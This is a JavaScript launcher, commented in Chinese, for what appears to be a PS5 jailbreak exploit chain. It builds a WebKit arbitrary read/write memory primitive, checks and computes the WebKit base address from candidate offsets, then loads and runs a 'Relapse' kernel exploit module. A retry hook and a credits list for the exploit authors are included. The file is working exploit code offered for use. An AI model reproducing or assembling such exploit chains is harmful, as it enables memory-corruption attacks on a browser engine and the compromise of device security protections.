"use strict";

import { establishPrimitive } from "./webkit.js";
import { installWindowP } from "./utils/mem.js";

const output = document.getElementById("console");

// 1. 強化日誌引擎：完美對接 index.html 的高亮樣式，並提供實時滾動
function writeLog(message, type = "log", replace = false) {
  if (window.log_to_ps5) {
    // 如果 index.html 有自訂的高階日誌引擎，優先使用它以保持視覺一致性
    let logType = 'info';
    if (type === 'error') logType = 'err';
    if (type === 'success') logType = 'ok';
    window.log_to_ps5(message, logType);
    return;
  }

  // 備用原生渲染邏輯
  let line = replace ? output.lastElementChild : null;
  if (!line) {
    line = document.createElement("div");
    output.appendChild(line);
  }
  let marker = "*";
  if (type === "error") marker = "-";
  if (type === "info" || type === "success") marker = "+";
  line.textContent = `[${marker}] ${message}`;
  output.scrollTop = output.scrollHeight;
}

function writeEvent(name, detail, type) {
  writeLog(detail == null || detail === "" ? name : `${name}: ${detail}`,
    type || (name === "Failed" ? "error" : "log"));
}

window.writeLog = writeLog;
window.jb = { mark: writeEvent };

// 2. 強度優化：加入 ARW 容錯原語檢查
async function getPrimitive() {
  writeLog("正在初始化 WebKit 漏洞引擎...", "info");
  
  // 建立基礎使用者空間任意讀寫
  const primitive = installWindowP(await establishPrimitive(writeEvent));
  
  // 硬性校驗原語的完整性，防止因偽造物件失敗引發後半段程式碼直接讓主機關機
  if (!primitive || typeof primitive.read8 !== "function" || typeof primitive.read64 !== "function") {
    throw new Error("Memory primitive unavailable");
  }

  writeLog("User-land 任意讀寫原語（ARW）建立成功！", "success");
  return primitive;
}

// 3. 強度優化：更嚴格的 WebKit 基底位址邊界與有效性校驗
function getWebKitBase() {
  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor !== "number" || typeof OFFSET_wk_host_constructor_candidates === "undefined")
    throw new Error("WebKit base inputs are unavailable");

  // 遍歷所有可能的構造函式候選偏移量
  for (const offset of OFFSET_wk_host_constructor_candidates) {
    const base = ctor - offset;
    
    // 強化驗證點：PS5 WebKit 在記憶體中的典型虛擬位址範圍必須介於 0x800000000 到 0x900000000 之間
    // 並且必須符合 0x4000 (頁面大小) 的整除對齊限制
    if (base >= 0x800000000 && base < 0x900000000 && base % 0x4000 === 0) {
      return base;
    }
  }

  throw new Error("WebKit base validation failed (Address out of bounds)");
}

// 4. 核心加強點：全自動生命週期控管與重試機制
async function run_exploit_pipeline() {
  // A. 版本合法性攔截
  const rejection = window.firmware.rejection();
  if (rejection) {
    throw new Error(rejection);
  }
  
  writeLog("Credits: Sonic_Iso, Jordy, ntfargo, ufm42, Dr. Yenyen, TheFlow, SlidyBat, Flatz, cow, nhk, bollarz, Sleirsgoevy, EchoStretch, EarthOnion", "info");
  writeLog(`Agent: ${navigator.userAgent}`, "info");
  writeLog(`Firmware: ${window.fw_str}`, "info");
  
  // B. 獲取記憶體控制權
  const primitive = await getPrimitive();
  
  // C. 計算並驗證 WebKit 基底位址
  const wkBase = getWebKitBase();
  writeLog(`WebKit Base 執行期實際位址: 0x${wkBase.toString(16)}`, "success");

  // D. 動態加載核心階段並執行
  writeLog("正在導入 Relapse 核心漏洞模組...", "info");
  await import("./relapse_exploit.js");
  
  // 執行 main.js 中的主流程
  await main(primitive);
}

// 5. 將啟動器掛載至全域視窗，供 index.html 的 SetupEngine 在修復記憶體後重複調用
window.trigger_stage1 = function() {
    run_exploit_pipeline().catch((error) => {
        let errorMsg = error instanceof Error ? error.message : String(error);
        writeLog(errorMsg, "error");
        
        // 核心修復銜接點：如果發生錯誤，強行交由 index.html 的容錯引擎處理，觸發自動重試
        if (window.PS5_SetupEngine && typeof window.PS5_SetupEngine.handleSetupFailure === "function") {
            window.PS5_SetupEngine.handleSetupFailure("WebKit 階段", errorMsg);
        }
    });
};

// 進入點：確認 DOM Ready 後自動觸發
window.trigger_stage1();
